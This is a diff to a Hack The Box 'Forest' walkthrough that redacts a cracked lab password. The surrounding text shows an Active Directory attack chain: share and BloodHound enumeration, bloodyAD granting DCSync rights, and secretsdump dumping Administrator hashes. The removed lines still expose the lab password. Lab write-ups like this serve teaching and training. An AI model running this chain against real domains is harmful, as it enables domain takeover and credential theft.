@@ -278,16 +278,16 @@ hashcat ./svc-alfresco.hash --show
 NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
 Do NOT report auto-detect issues unless you are certain of the hash type.
 
-$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e642fded4cfba11da8b7c9e13b03b59$ecfd876d978c03d966519923d151fb8ced63e52c4e3b1c688095533516eb069fa5decf80b090bda12765ded3f71395438b0caf0680b8c9b340c0d8f91b90af9b8bf17888ac361117fb0c58a2849deaef7e1ec1b5d17844bcc84d7a078f54a8d1592a5d985a113f46901994bb5333b3e21a291de64af20345b27c5aa066bf1ccc35d3bbdc24de45280ee8f9e4ca286d00f43a0565561703d45faa01d41fe5e959a6bd581828adfbd30791ca6d7ed954a614b0326430ca69ae64d11423dc2786d6c65489e6e069ca48687327bcde4fdf7b0949db57a8f6a468a22251ab05ea6e38f1465ceb5573:s3rvice
+$krb5asrep$23$svc-alfresco@HTB.LOCAL:4e642fded4cfba11da8b7c9e13b03b59$ecfd876d978c03d966519923d151fb8ced63e52c4e3b1c688095533516eb069fa5decf80b090bda12765ded3f71395438b0caf0680b8c9b340c0d8f91b90af9b8bf17888ac361117fb0c58a2849deaef7e1ec1b5d17844bcc84d7a078f54a8d1592a5d985a113f46901994bb5333b3e21a291de64af20345b27c5aa066bf1ccc35d3bbdc24de45280ee8f9e4ca286d00f43a0565561703d45faa01d41fe5e959a6bd581828adfbd30791ca6d7ed954a614b0326430ca69ae64d11423dc2786d6c65489e6e069ca48687327bcde4fdf7b0949db57a8f6a468a22251ab05ea6e38f1465ceb5573:<redacted>
 ```
 
 ## SMB/LDAP/BLOODHOUND
 
 With our credentials, we can now authenticate to the SMB share using the `nxc` command and see if we have any unusual share access
 ```
-nxc smb forest.htb.local -u svc-alfresco -p s3rvice --shares
+nxc smb forest.htb.local -u svc-alfresco -p <redacted> --shares
 SMB         10.10.10.161    445    FOREST           [*] Windows 10 / Server 2016 Build 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
-SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
+SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:<redacted>
 SMB         10.10.10.161    445    FOREST           [*] Enumerated shares
 SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
 SMB         10.10.10.161    445    FOREST           -----           -----------     ------
@@ -300,14 +300,14 @@ SMB         10.10.10.161    445    FOREST           SYSVOL          READ        
 > Command breakdown:
 - `nxc smb forest.htb.local` : This command is used to connect to the SMB share on the target machine.
 - `-u svc-alfresco` : This flag specifies the username to authenticate with.
-- `-p s3rvice` : This flag specifies the password to authenticate with.
+- `-p <redacted>` : This flag specifies the password to authenticate with.
 - `--shares` : This flag specifies that we want to enumerate the shares on the target machine.
 {: .prompt-info}
 
 Nothing out of the ordinary, we can also try to enumerate the domain using a tool called bloodhound.
 
 ```shell
-bloodhound-ce-python -d htb.local -u svc-alfresco -p 's3rvice' -ns 10.10.10.161 -dc FOREST.htb.local --zip -c all
+bloodhound-ce-python -d htb.local -u svc-alfresco -p '<redacted>' -ns 10.10.10.161 -dc FOREST.htb.local --zip -c all
 INFO: BloodHound.py for BloodHound Community Edition
 INFO: Found AD domain: htb.local
 INFO: Getting TGT for user
@@ -337,7 +337,7 @@ INFO: Compressing output into 20250424032608_bloodhound.zip
 - `bloodhound-ce-python` : This command is used to run the BloodHound Python for the Community Edition of Bloodhound.
 - `-d htb.local` : This flag specifies the domain to enumerate.
 - `-u svc-alfresco` : This flag specifies the username to authenticate with.
-- `-p 's3rvice'` : This flag specifies the password to authenticate with.
+- `-p '<redacted>'` : This flag specifies the password to authenticate with.
 - `-ns 10.10.10.161` : This flag specifies the IP address of the LDAP server to connect to.
 - `-dc FOREST.htb.local` : This flag specifies the domain controller to connect to.
 - `--zip` : This flag specifies that we want to compress the output into a zip file. Otherwise, we would get a collection of `.json` files.
@@ -371,10 +371,10 @@ This path involves the following steps:
 - DCSync the domain
 
 ```
-bloodyAD --host FOREST.htb.local -u svc-alfresco -p s3rvice add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
+bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco
 [+] svc-alfresco added to EXCHANGE WINDOWS PERMISSIONS
 
-bloodyAD --host FOREST.htb.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco
+bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add dcsync svc-alfresco
 [+] svc-alfresco is now able to DCSync
 
 secretsdump.py -just-dc-user Administrator htb.local/svc-alfresco@FOREST.htb.local
@@ -393,8 +393,8 @@ htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
 ```
 
 > Command breakdown:
-- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p s3rvice add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco` : This command adds the user svc-alfresco to the group "EXCHANGE WINDOWS PERMISSIONS".
-- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p s3rvice add dcsync svc-alfresco` : This command enables DCSync rights for the user svc-alfresco.
+- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add groupMember "EXCHANGE WINDOWS PERMISSIONS" svc-alfresco` : This command adds the user svc-alfresco to the group "EXCHANGE WINDOWS PERMISSIONS".
+- `bloodyAD --host FOREST.htb.local -u svc-alfresco -p <redacted> add dcsync svc-alfresco` : This command enables DCSync rights for the user svc-alfresco.
 - `secretsdump.py` : This command dumps the NTDS.DIT secrets from the domain controller using the DRSUAPI method.
 - `-just-dc-user Administrator` : This flag specifies that we want to dump the NTDS.DIT secrets only for the user Administrator.
 {: .prompt-info}
